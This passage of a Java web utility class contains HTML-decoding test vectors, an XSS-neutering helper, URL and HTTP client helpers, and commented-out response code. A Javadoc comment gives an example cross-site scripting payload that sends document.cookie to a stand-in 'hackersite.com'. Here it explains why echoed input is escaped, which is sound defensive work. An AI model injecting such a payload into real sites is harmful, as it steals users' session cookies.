"<%26%23>"}, {"<a href=\"%u0063%u006f%U006F%U006B%u0069%u0065\">", "<a href=\"cookie\">"}, {"<a href=\"%&#117;0063%&#117;006f%&#85;006F%&#85;006B%&#117;0069%&#117;0065\">", "<a href=\"cookie\">"}};
        IPUtil.uninterruptedSleep(2000);
        for (int i = 0; i < testData.length; i++) {
            String input = testData[i][0];
            String output = getDeHTMLEntityizedString(input, true);
            output = decodeURLEncodedCharactersInHTMLTags(output);
            output = getDeHTMLEntityizedString(output, true);
            String expectedOutput = testData[i][1];
            Debug.assertMsg(logger, IPUtil.isEqual(output, expectedOutput), "For input of '" + input + "' expected '" + expectedOutput + "' got '" + output + "'");
        }
        System.out.println();
    }

    /**
     * getHTMLNeuteredString should be used, inter alia, whenever
     * an applicationerror echos something input by a user.
     * <p>
     * e.g. say a user puts an url like this on their site:
     * http://site/path?s=<script>document.location='hackersite.com/'+document.cookie</script>
     * <p>
     * And we echoed the s=param as in "s '%siteid' is invalid", then whoever clicked on the link
     * would have their cookies exposed.
     *
     * @return a string that should have no nasty HTML in it (< will be
     * replaced by &lt; instead)
     */
    public static String getHTMLNeuteredString(String s) {
        // convert tricky entities back to ascii, i.e. no enoding of '<' for example
        s = IPHTMLUtil.getDeHTMLEntityizedString(s, true);
        return HtmlTextMassager.disableHtml(s);
    }

    /**
     * a single pixel, blank, gif IIRC
     */
    public static byte s_BlankImage[] = {71, 73, 70, 56, 57, 97, 1, 0, 1, 0, -9, 0, 0, 0, 0, 0, -128, -128, -128, -128, 0, 0, -128, -128, 0, 0, -128, 0, 0, -128, -128, 0, 0, -128, -128, 0, -128, -128, -128, 64, 0, 64, 64, 0, -128, -1, 0, 64, -128, 64, 0, -1, -128, 64, 0, -1, -1, -1, -64, -64, -64, -1, 0, 0, -1, -1, 0, 0, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, -1, -1, -1, -128, 0, -1, -128, -128, -1, -1, -128, -128, -1, -1, 0, -128, -1, -128, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 33, -7, 4, 1, 0, 0, 16, 0, 44, 0, 0, 0, 0, 1, 0, 1, 0, 0, 8, 4, 0, 53, 4, 4, 0, 59};

    /**
     * Ensures that the provided URL is absolute,  if it is not then it will prepend the prefix URL to the url
     *
     * @param url       The URL to ensure is absolute
     * @param prefixURL The prefixURL to prepend if the URL is not
     * @return The absolute URL resultant
     */
    public static String getAbsoluteURL(String url, String prefixURL) {
        Debug.assertMsg(logger, !IPStringUtil.isEmpty(prefixURL) && (prefixURL.startsWith("http://") || prefixURL.startsWith("https://")), "The prefix URL is a required field,  and must be absolute.");
        Debug.assertMsg(logger, !IPStringUtil.isEmpty(url), "A URL must be provided");

        if (url.startsWith("http://")) {
            return url;
        }

        if (url.startsWith("https://")) {
            return url;
        }

        // From here it gets tricky.  The provided URL can be / or path.  We will need to do things to the prefixURL based on the start of the URL
        //   / = back a directory on the prefixURL if a prefix URL is provided
        if (url.startsWith("/")) {

            // first thing first,  remove any / from the end of the prefixURL
            if (prefixURL.endsWith("/")) {
                prefixURL = prefixURL.substring(0, prefixURL.length() - 2);
            }

            // Lets find out if there are even directories beyond the domain name
            int dNameIndex = prefixURL.indexOf("://") + 3;
            int slashIndex = IPStringUtil.getLastIndexOfStringInString(prefixURL, "/");
            // OK,  is there a directory beyond the domain name,  if so remove the last one
            if (slashIndex > dNameIndex) {
                prefixURL = prefixURL.substring(0, slashIndex);
            }

            // OK,  now lets ensure that the URL does not start with a slash
            url = url.substring(1);

            // jw:  the net result of this is that the url will not start with a / in either case,
            // and the prefixURL should be good to go (last directory should be removed)
            // Everything should be at a stable state now
        }

        // Now lets ensure that the prefix URL ends with a / since we know that hte url does not start with one
        if (!prefixURL.endsWith("/")) {
            prefixURL += "/";
        }

        // Return the two of them together.
        return prefixURL + url;
    }

    public static String getUrlResponse(String requestUrl) {
        ObjectPair<String, Integer> response = getUrlResponseWithCode(requestUrl, null, null);

        if (response == null) {
            return null;
        }

        return response.getOne();
    }

    public static ObjectPair<String, Integer> getUrlResponseWithCode(String requestUrl, Integer connectTimeout, Integer readTimeout) {
        try {
            URL url = new URL(requestUrl);

            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            if (connectTimeout == null && readTimeout == null) {
                setDefaultHttpTimeouts(con);
            } else {
                assert connectTimeout != null && readTimeout != null : "Should always specify both timeouts if specifying one!";
                con.setConnectTimeout(connectTimeout);
                con.setReadTimeout(readTimeout);
            }

            int responseCode = con.getResponseCode();
            if (responseCode >= HttpServletResponse.SC_INTERNAL_SERVER_ERROR) {
                return new ObjectPair<String, Integer>(null, responseCode);
            }
            StringWriter writer = new StringWriter();
            Reader reader = null;
            try {
                reader = new InputStreamReader(con.getInputStream(), IPUtil.IANA_UTF8_ENCODING_NAME);

                char[] buffer = new char[1024];
                int charRead;
                while ((charRead = reader.read(buffer)) != -1) {
                    writer.write(buffer, 0, charRead);
                }

                writer.flush();
                writer.close();
                return new ObjectPair<String, Integer>(writer.getBuffer().toString(), responseCode);

            } catch (Throwable t) {
                logger.error("Failed getting request response: " + requestUrl, t);

            } finally {
                if (reader != null) {
                    reader.close();
                }
            }
            return new ObjectPair<String, Integer>(null, responseCode);

        } catch (MalformedURLException e) {
            logger.error("Unexpected malformed url when making request: " + requestUrl, e);

        } catch (IOException e) {
            logger.error("Unexpected ioexception when making request: " + requestUrl, e);
        }

        return null;
    }

    public static void setDefaultHttpTimeouts(HttpURLConnection connection) {
        connection.setConnectTimeout(IPDateUtil.MINUTE_IN_MS);
        connection.setReadTimeout(2 * IPDateUtil.MINUTE_IN_MS);
    }

    public static HttpClient getDefaultHttpClient() {
        return getHttpClient(IPDateUtil.MINUTE_IN_MS, 2 * IPDateUtil.MINUTE_IN_MS);
    }

    public static HttpClient getHttpClient(int connectionTimeout, int socketTimeout) {
        HttpClient client = new HttpClient();
        client.getHttpConnectionManager().getParams().setConnectionTimeout(connectionTimeout);
        client.getHttpConnectionManager().getParams().setSoTimeout(socketTimeout);

        // bl: in addition to the connection params above, let's set the client's socket timeout and
        // connection manager timeout, too.
        HttpClientParams params = new HttpClientParams();
        params.setConnectionManagerTimeout(connectionTimeout);
        params.setSoTimeout(socketTimeout);
        client.setParams(params);

        return client;
    }

    public static String getUrlResponse(String url, Map<String, String> headers) {
        HttpClient httpClient = getDefaultHttpClient();
        GetMethod get = new GetMethod(url);
        for (Map.Entry<String, String> entry : headers.entrySet()) {
            get.addRequestHeader(entry.getKey(), entry.getValue());
        }

        try {
            int response = httpClient.executeMethod(get);

            if (response != HttpStatus.SC_OK) {
                return null;
            }

            return get.getResponseBodyAsString();

        } catch (HttpException e) {
            logger.error("Unexpected http exception making post request! " + url, e);

        } catch (IOException e) {
            logger.error("Unexpected io exception making post request! " + url, e);
        }

        return null;
    }

    public static String getPostResponse(String url, Map<String, String> params) {
        HttpClient httpClient = getDefaultHttpClient();
        PostMethod post = new PostMethod(url);
        for (Map.Entry<String, String> param : params.entrySet()) {
            post.addParameter(param.getKey(), param.getValue());
        }

        try {
            int response = httpClient.executeMethod(post);

            if (response != HttpStatus.SC_OK) {
                return null;
            }

            return post.getResponseBodyAsString();

        } catch (HttpException e) {
            logger.error("Unexpected http exception making post request! " + url, e);

        } catch (IOException e) {
            logger.error("Unexpected io exception making post request! " + url, e);
        }

        return null;
    }

    public static String getLink(String href, String text) {
        return getElementString("a", text, Collections.singletonMap("href", href));
    }

    public static String getElementString(String name, Map<String, String> attributes) {
        StringBuilder element = new StringBuilder();
        XMLUtil.addField(element, name, null, attributes);
        return element.toString().trim();
    }

    public static String getElementString(String name, String text, Map<String, String> attributes) {
        StringBuilder element = new StringBuilder();
        if (!isEmptyOrNull(attributes)) {
            XMLUtil.openTagWithAttributes(element, name, attributes);
        } else {
            XMLUtil.openTag(element, name);
        }
        if (!isEmpty(text)) {
            element.append(text);
        }
        XMLUtil.closeTag(element, name);

        return element.toString().trim();
    }

    public static final ResponseHandler<String> STRING_RESPONSE_HANDLER = new ResponseHandler<String>() {
        @Override
        public String handleResponse(HttpResponse httpResponse) throws IOException {
            int httpResponseCode = httpResponse.getStatusLine().getStatusCode();
            if (httpResponseCode >= 200 && httpResponseCode < 300) {
                HttpEntity entity = httpResponse.getEntity();
                return entity != null ? EntityUtils.toString(entity) : null;
            }

            return null;
        }
    };

    public static final ResponseHandler<byte[]> BYTE_RESPONSE_HANDLER = new ResponseHandler<byte[]>() {
        @Override
        public byte[] handleResponse(HttpResponse httpResponse) throws IOException {
            int httpResponseCode = httpResponse.getStatusLine().getStatusCode();
            if (httpResponseCode >= 200 && httpResponseCode < 300) {

                HttpEntity entity = httpResponse.getEntity();
                if (entity == null) {
                    return null;
                }
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                entity.writeTo(baos);

                return baos.toByteArray();
            }

            return null;
        }
    };

    public static String getStringResponseFromGetRequest(String url, Integer connectionTimeout, Integer socketTimeout) throws IOException {
        return getResponseFromGetRequest(url, connectionTimeout, socketTimeout, STRING_RESPONSE_HANDLER);
    }

    public static byte[] getByteResponseFromGetRequest(String url, Integer connectionTimeout, Integer socketTimeout) throws IOException {
        return getResponseFromGetRequest(url, connectionTimeout, socketTimeout, BYTE_RESPONSE_HANDLER);
    }

    public static <T> T getResponseFromGetRequest(String url, Integer connectionTimeout, Integer socketTimeout, ResponseHandler<T> handler) throws IOException {
        HttpGet request = new HttpGet(url);

        boolean hasConnectionTimeout = connectionTimeout != null;
        boolean hasSocketTimeout = socketTimeout != null;
        if (hasConnectionTimeout || hasSocketTimeout) {
            RequestConfig.Builder config = RequestConfig.custom();
            if (hasConnectionTimeout) {
                config.setConnectTimeout(connectionTimeout);
            }
            if (hasSocketTimeout) {
                config.setSocketTimeout(socketTimeout);
            }
            request.setConfig(config.build());
        }

        CloseableHttpClient httpClient = HttpClients.createDefault();

        return httpClient.execute(request, handler);
    }
}

/**
 * Send html, return a count of bytes sent
 * public static int sendHTML(HttpServletRequest req, HttpServletResponse res
 * , StringBuffer html, String contentType, String ianaEncoding) {
 * return sendHTML0(req,res,html,null,contentType,ianaEncoding);
 * }
 * <p>
 * changes the html to doc.writes if requested.  Prepends spaces (a m$
 * Internet Explorer workaround.
 * public static StringBuffer getStringBufferPreppedForHTMLSend(StringBuffer html
 * , boolean disableContentEncoding
 * , boolean asDocWrites) {
 * if(asDocWrites) {
 * // turn this into a non-asDocWrites request
 * html = IPHTMLUtil.getStringAsDocumentWrites(html.toString());
 * }
 * if(!disableContentEncoding && IPHTMLUtil.do_html_content_encoding) {
 * // m$ Explorer workaround (maybe) since IE seems to drop the first 2048-2053 odd chars
 * // it receives.  doing it here not in the send cause this is what will be compressed
 * // and cached
 * html = html.insert(0, IPStringUtil.getThreeKBlankString());
 * }
 * return html;
 * }
 */

/**
 * changes the html to doc.writes if requested.  Prepends spaces (a m$
 * Internet Explorer workaround.
 public static StringBuffer getStringBufferPreppedForHTMLSend(StringBuffer html
 , boolean disableContentEncoding
 , boolean asDocWrites) {
 if(asDocWrites) {
 // turn this into a non-asDocWrites request
 html = IPHTMLUtil.getStringAsDocumentWrites(html.toString());
 }
 if(!disableContentEncoding && IPHTMLUtil.do_html_content_encoding) {
 // m$ Explorer workaround (maybe) since IE seems to drop the first 2048-2053 odd chars
 // it receives.  doing it here not in the send cause this is what will be compressed
 // and cached
 html = html.insert(0, IPStringUtil.getThreeKBlankString());
 }
 return html;
 }
 */
/*
            public static int sendBytes(HttpServletResponse res, byte bytes[], String contentType
                                        , String ianaEncoding) {
                try {
                    OutputStream os = res.getOutputStream();
                    res.setContentType(contentType == null ? "text/html" : contentType
                                       + (ianaEncoding == null ? "" : "; charset="+ ianaEncoding));
                    res.setContentLength(bytes.length);
                    os.write(bytes);
                    os.flush();
                    // fix errors?
                    os.close();
                    return bytes.length;
                } catch(IOException ioex) {
                    if(logger.isInfoEnabled()) logger.info( "Failed sending html output", ioex);
                }
                return 0;

            }
*/

/*
public static int sendHTMLBytes(HttpServletRequest req, HttpServletResponse res
                    , byte gzipped_utf8_bytes[], String contentType, String ianaEncoding) {
return sendHTML0(req,res,null,gzipped_utf8_bytes,contentType,ianaEncoding);
}
*/

/*
private static int sendHTML0(HttpServletRequest req, HttpServletResponse res
                             , StringBuffer html, byte gzipped_utf8_bytes[], String contentType
                             , String ianaEncoding) {
    HTTPResponse.MetaData metaData = new HTTPResponse.MetaData
                         (contentType
                          , ianaEncoding
                          , -1
                          , null);
    HTTPResponse.StringData stringData = new HTTPResponse.StringData(ianaEncoding, null);
    HTTPResponse.PairResponse response = new HTTPResponse.PairResponse(metaData, stringData);
    if(html!=null) {
        stringData.setStringData(html.toString());
    }
    // figure out what to do with the gzip bytes
    do {
        if(gzipped_utf8_bytes==null)
            break;
        String encoding = response.metaData.ianaEncoding!=null ? response.metaData.ianaEncoding
                          : IPUtil.IANA_UTF8_ENCODING_NAME;
        // bytes are in the right encoding
        if(encoding.equals(IPUtil.IANA_UTF8_ENCODING_NAME)) {
            stringData.setGzippedByteData(gzipped_utf8_bytes);
            break;
        }
        // bytes are in the wrong encoding

        // let's just use the html
        if(html!=null)
            break;
        // no html, we need to get these to something usable:
        byte unGzipped[] = IPIOUtil.getUnGzippedData(gzipped_utf8_bytes);
        try {
            String s = new String(unGzipped, IPUtil.getJavaEncoding(IPUtil.IANA_UTF8_ENCODING_NAME));
            s=IPStringUtil.getStringAfterStripFromStart(s, IPStringUtil.getThreeKBlankString());
            stringData.setStringData(s);
        } catch(java.io.UnsupportedEncodingException use) {
            Debug.assertMsg(logger, false, "Failed converting bytes to utf8");
        }
    } while(false);
    return sendHttpResponse(req,res,response);
}
*/
